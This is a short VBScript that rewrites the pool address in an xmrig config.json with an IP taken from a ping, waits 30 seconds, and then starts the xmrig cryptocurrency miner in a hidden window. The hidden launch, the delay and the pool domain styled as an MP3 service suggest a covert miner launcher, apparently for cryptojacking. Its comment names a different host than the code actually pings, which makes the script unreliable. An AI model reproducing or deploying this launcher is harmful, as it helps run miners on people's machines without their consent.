Option Explicit

Dim objFSO, objShell, jsonFile, jsonContent, objFile, pingResult, xmrigPath

' Initialize objects
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Paths
jsonFile = objShell.CurrentDirectory & "\config.json"
xmrigPath = objShell.CurrentDirectory & "\xmrig.exe"

' Check if config.json exists
If Not objFSO.FileExists(jsonFile) Then
    MsgBox "config.json not found in the current directory. Exiting."
    WScript.Quit
End If

' Ping myhost.noip.com to get the current IP
Dim objExec, ipAddress
Set objExec = objShell.Exec("ping -n 1 facebook.com")
Do While objExec.Status = 0
    WScript.Sleep 100
Loop

pingResult = objExec.StdOut.ReadAll

' Extract IP address from ping result
Dim matches, regex
Set regex = New RegExp
regex.Pattern = "\b\d{1,3}(\.\d{1,3}){3}\b" ' Matches an IPv4 address
regex.Global = False

Set matches = regex.Execute(pingResult)
If matches.Count > 0 Then
    ipAddress = matches(0).Value
Else
    MsgBox "Failed to retrieve IP address. Exiting."
    WScript.Quit
End If

' Read and modify config.json
Set objFile = objFSO.OpenTextFile(jsonFile, 1, False)
jsonContent = objFile.ReadAll
objFile.Close

' Replace the URL with the new IP address
Dim newUrl
newUrl = ipAddress & ":3333"
jsonContent = Replace(jsonContent, """url"": ""mp3serve.servemp3.com:3333""", """url"": """ & newUrl & """")

' Write the updated config.json
Set objFile = objFSO.OpenTextFile(jsonFile, 2, False)
objFile.Write jsonContent
objFile.Close

' Wait 30 seconds before launching xmrig
WScript.Sleep 30000

' Launch xmrig.exe
If objFSO.FileExists(xmrigPath) Then
    objShell.Run """" & xmrigPath & """", 0, False
Else
    MsgBox "xmrig.exe not found in the current directory. Exiting."
    WScript.Quit
End If
